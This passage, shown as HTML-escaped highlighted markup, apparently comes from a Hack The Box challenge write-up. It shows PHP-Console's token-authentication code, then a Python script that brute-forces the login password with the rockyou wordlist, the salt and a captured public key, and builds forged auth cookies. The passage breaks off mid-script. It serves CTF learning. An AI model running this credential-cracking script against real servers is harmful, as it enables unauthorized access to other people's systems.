&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;serverAuthStatus&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;isSuccess &lt;&#x2F;span&gt;&lt;span&gt;= $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;clientAuth &lt;&#x2F;span&gt;&lt;span&gt;&amp;amp;&amp;amp; $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;isValidAuth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;clientAuth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;serverAuthStatus&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * Check if client authorization data is valid
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@codeCoverageIgnore
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@param&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; ClientAuth $clientAuth
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; bool
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; *&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;final &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;isValidAuth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;ClientAuth &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;clientAuth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;) {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;clientAuth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;publicKey &lt;&#x2F;span&gt;&lt;span&gt;=== $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getPublicKey&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;() &lt;&#x2F;span&gt;&lt;span&gt;&amp;amp;&amp;amp; $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;clientAuth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;token &lt;&#x2F;span&gt;&lt;span&gt;=== $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getToken&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;();
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * Get client unique identification
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; string
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; *&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;protected function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;getClientUid&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;() {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;clientUid &lt;&#x2F;span&gt;&lt;span&gt;= &amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;publicKeyByIp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;) {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;isset&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_SERVER&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;REMOTE_ADDR&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;])) {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;			&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;clientUid &lt;&#x2F;span&gt;&lt;span&gt;.= $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_SERVER&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;REMOTE_ADDR&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;];
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;		}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;isset&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_SERVER&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;HTTP_X_FORWARDED_FOR&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;])) {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;			&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;clientUid &lt;&#x2F;span&gt;&lt;span&gt;.= $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_SERVER&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;HTTP_X_FORWARDED_FOR&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;];
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;		}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;clientUid&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * Get authorization session public key for current client
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; string
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; *&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;protected function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;getPublicKey&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;() {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getClientUid&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;() &lt;&#x2F;span&gt;&lt;span&gt;. $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;passwordHash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * Get string signature for current password &amp;amp; public key
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@param&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; $string
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; string
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; *&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;final &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;getSignature&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;) {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;passwordHash &lt;&#x2F;span&gt;&lt;span&gt;. $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getPublicKey&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;() &lt;&#x2F;span&gt;&lt;span&gt;. $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * Get expected valid client authorization token
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; string
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; *&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;private &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;final &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;getToken&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;() {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;passwordHash &lt;&#x2F;span&gt;&lt;span&gt;. $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getPublicKey&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;());
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;After reviewing the code, I figured out the token is salted and using sha256 to generate the token. It was a matter of creating a brute forcing python script to figure out what is the actual password to log into PHP-Console Chrome extension.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;hashlib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;sha256
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;base64 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;b64encode
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;json
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;url = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;docker.hackthebox.eu:31828&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# publickey found in the PHP-Console HTTP header
&lt;&#x2F;span&gt;&lt;span&gt;publickey = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Open rockyou.txt file in read mode
&lt;&#x2F;span&gt;&lt;span&gt;file = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;.&#x2F;rockyou.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Create for loop to iterate through each entry in rockyou.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;   word = file.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;readline&lt;&#x2F;span&gt;&lt;span&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# For every line in rockyou.txt, append the salt to prepare to later create the hash
&lt;&#x2F;span&gt;&lt;span&gt;   password = word + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;NeverChangeIt:)&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# return hash(&amp;#39;sha256&amp;#39;, $string);
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# In the auth.php, it uses sha256 to create the hash using the string + salt.
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hash &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(password.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;()).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# return $this-&amp;gt;hash($this-&amp;gt;passwordHash . $this-&amp;gt;getPublicKey());
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Also it uses the sha256 salted hash with the publickey to generate another sha256 hash for the token.
&lt;&#x2F;span&gt;&lt;span&gt;   token = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hash &lt;&#x2F;span&gt;&lt;span&gt;+ publickey).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;()).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Now start putting together the HTTP GET request starting with the HTTP header paramters
&lt;&#x2F;span&gt;&lt;span&gt;   phpconsoleclient = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;{&amp;quot;php-console-client&amp;quot;:5,&amp;quot;auth&amp;quot;:{&amp;quot;publicKey&amp;quot;:&amp;quot;d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e&amp;quot;,&amp;quot;token&amp;quot;:&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(token) + &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;}}&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# The original GET request has encoded php-console-client into base64, this step is doing the same thing. The decode function changes the object type
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# from bytes to string.
&lt;&#x2F;span&gt;&lt;span&gt;   phpconsoleclient = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;b64encode&lt;&#x2F;span&gt;&lt;span&gt;(phpconsoleclient.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;()).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Add all the cookies required in the original GET request.
&lt;&#x2F;span&gt;&lt;span&gt;   cookies = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;php-console-server=5; php-console-client=&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(phpconsoleclient)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Create a python dictionary object to store the header parameters
&lt;&#x2F;span&gt;&lt;span&gt;   headers = { &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Cookie&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; : cookies }
&lt;&#x2F;span&gt;&lt;span&gt;
